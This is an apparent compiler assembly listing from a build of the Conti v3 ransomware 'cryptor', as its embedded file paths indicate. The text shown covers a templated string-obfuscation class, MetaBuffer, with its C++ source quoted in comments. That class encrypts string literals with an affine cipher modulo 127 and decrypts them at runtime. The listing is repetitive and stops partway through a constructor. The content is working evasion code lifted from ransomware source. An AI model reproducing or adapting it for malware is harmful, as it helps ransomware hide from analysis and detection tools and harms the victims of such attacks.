?decrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001d9	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  001dd	88 85 c0 00 00
	00		 mov	 BYTE PTR tv168[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  001e3	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  001ea	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  001f1	5f		 pop	 rdi
  001f2	5d		 pop	 rbp
  001f3	c3		 ret	 0
??0?$MetaBuffer@$0EJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<73,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 5c	 sub	 eax, 92			; 0000005cH
  0002d	6b c0 ee	 imul	 eax, eax, -18
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 07	 imul	 eax, eax, 7
  0002d	83 c0 5c	 add	 eax, 92			; 0000005cH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$06$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<7,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
